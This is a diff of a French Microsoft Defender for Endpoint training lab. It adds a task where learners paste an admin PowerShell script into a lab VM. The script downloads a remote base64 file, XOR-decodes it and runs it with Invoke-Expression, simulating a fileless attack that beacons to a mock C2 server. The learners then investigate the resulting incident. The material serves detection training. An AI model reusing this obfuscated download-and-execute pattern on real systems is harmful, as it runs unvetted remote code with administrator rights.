@@ -40,20 +40,6 @@ Dans cette tâche, vous allez confirmer que l’appareil a été intégré avec 
 
     >**Remarque :** La fenêtre se ferme automatiquement après l’exécution du script et, après quelques minutes, les alertes sont générées dans le portail Microsoft Defender XDR.
 
-<!--- ### Task 2: Simulated Attacks
-
->**Note:** The Evaluation lab and the Tutorials & simulations section of the portal is no longer available. Please refer to the **[interactive lab simulation](https://mslabs.cloudguides.com/guides/SC-200%20Lab%20Simulation%20-%20Mitigate%20attacks%20with%20Microsoft%20Defender%20for%20Endpoint)** for a demonstration of the simulated attacks.
-
-1. From the left menu, under **Endpoints**, select **Evaluation & tutorials** and then select **Tutorials & simulations** from the left side.
-
-1. Select the **Tutorials** tab.
-
-1. Under *Automated investigation (backdoor)* you will see a message describing the scenario. Below this paragraph, click **Read the walkthrough**. A new browser tab opens which includes instructions to perform the simulation.
-
-1. In the new browser tab, locate the section named **Run the simulation** (page 5, starting at step 2) and follow the steps to run the attack. **Hint:** The simulation file *RS4_WinATP-Intro-Invoice.docm* can be found back in portal, just below the **Read the walkthrough** you selected in the previous step by selecting the **Get simulation file** button.
-
-    <!--- 1. Repeat the last 3 steps to run another tutorial, *Automated investigation (fileless attack)*. This is no longer working due to win1 AV --->
-
 ### Tâche 2 : Examiner les alertes et les incidents
 
 Dans cette tâche, vous allez examiner les alertes et les incidents générés par le script de test de détection d’intégration dans la tâche précédente.
@@ -84,6 +70,46 @@ Dans cette tâche, vous allez examiner les alertes et les incidents générés p
 
 1. Passez en revue le contenu des onglets  *Histoire d’attaque, Alertes, Ressources, Investigations, Preuve et réponse* et *Résumé*. Les appareils et les utilisateurs se trouvent sous l’onglet *Ressources*. Dans un vrai incident, l’onglet *Historique de l’attaque* affiche le *graphique de l’incident*. **Conseil :** Certains onglets risquent d’être masqués en raison de la taille de votre écran. Sélectionnez l’onglet représentant des points de suspension (...) pour les afficher.
 
-<!---    >**Warning:** The simulated attacks here are an excellent source of learning through practice. Only perform the attacks in the instructions provided for this lab when using the course provided Azure tenant.  You may perform other simulated attacks *after* this training course is complete with this tenant. --->
+### Tâche 3 : Simuler une attaque
+
+>**Avertissement :** Cette attaque simulée constitue une excellente source d’apprentissage via la pratique. Effectuez uniquement l’attaque dans les instructions fournies pour ce labo lors de l’utilisation du cours fourni au tenant Azure.  Vous pouvez effectuer d’autres attaques simulées *après* avoir effectué ce cours de formation avec ce tenant.
+
+Dans cette tâche, vous allez simuler une attaque sur la machine virtuelle WIN1 et vérifier la détection et l’atténuation de l’attaque par Microsoft Defender for Endpoint.
+
+1. Sur la machine virtuelle WIN1, *cliquez avec le bouton droit* sur **Démarrer**, puis choisissez **Windows PowerShell (admin)**.
+
+1. Lorsque la fenêtre « Contrôle de compte d’utilisateur » apparaît, sélectionnez **Oui** pour autoriser l’exécution de l’application.
+
+1. Copiez et collez le script de simulation suivant dans la fenêtre PowerShell, puis appuyez sur **Entrée** pour l’exécuter :
+
+    ```PowerShell
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+    ;$xor = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');
+    $base64String = (Invoke-WebRequest -URI "https://wcdstaticfilesprdeus.blob.core.windows.net/wcdstaticfiles/MTP_Fileless_Recon.txt" -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;
+    $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
+    $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
+    ```
+
+    >**Remarque :** Si vous rencontrez des erreurs (en rouge) lors de l’exécution du script, vous pouvez ouvrir l’application Bloc-notes et copier le script dans un fichier vide. Vérifiez que *Retour automatique à la ligne* est activé dans Bloc-notes. Copiez et exécutez séparément chaque ligne du script dans PowerShell.
+
+1. Le script génère plusieurs lignes de sortie et un message indiquant *Impossible de résoudre les contrôleurs de domaine dans le domaine*. Quelques secondes plus tard, l’application *Bloc-notes* s’ouvre. Un code d’attaque simulé est injecté dans Bloc-notes. Laissez l’instance Bloc-notes générée automatiquement ouverte pour expérimenter le scénario complet. Le code d’attaque simulé va tenter de communiquer avec une adresse IP externe (simulant un serveur C2).
+
+### Tâche 4 : Examiner l’attaque simulée en tant qu’incident unique
+
+1. Dans le portail Microsoft Defender XDR, sélectionnez **Incidents et alertes** dans le menu de gauche, puis **Incidents**.
+
+1. Un nouvel incident appelé *Incident à plusieurs étapes impliquant le contournement de la défense et la découverte sur un point de terminaison* se trouve dans le volet droit. Sélectionnez le nom de l’incident pour charger ses informations.
+
+1. Sous l’onglet *Historique de l’attaque*, réduisez les volets **Alertes** et **Détails de l’incident** pour afficher le **Graphique de l’incident** complet.
+
+1. Placez la souris au-dessus et sélectionnez les **Nœuds du graphique de l’incident** pour passer en revue les *entités*.
+
+1. Développez à nouveau le volet **Alertes** (côté gauche) et sélectionnez l’icône **Lire l’historique de l’attaque** *Exécuter*. Cela montre la chronologie de l’attaque alerte par alerte et remplit dynamiquement le *Graphique Ide l’incident*.
+
+1. Passez en revue le contenu des onglets  *Histoire d’attaque, Alertes, Ressources, Investigations, Preuve et réponse* et *Résumé*. Les appareils et les utilisateurs se trouvent sous l’onglet *Ressources*. **Conseil :** Certains onglets risquent d’être masqués en raison de la taille de votre écran. Sélectionnez l’onglet représentant des points de suspension (...) pour les afficher.
+
+1. Sous l’onglet **Preuve et réponse**, sélectionnez **Adresses IP**, puis sélectionnez l’*Adresse IP* affichée. Dans la fenêtre contextuelle, passez en revue les détails de l’adresse IP et faites défiler vers le bas de l’écran, puis sélectionnez le bouton **Ouvrir la page d’adresse IP**.
+
+1. Passez en revue le contenu de la page *Adresse IP*, des onglets *Vue d’ensemble, Incidents et alertes et Observé dans les organisations*. Il est possible que certains onglets ne contiennent pas d’informations relatives à l’adresse IP.
 
 ## Vous avez terminé le labo
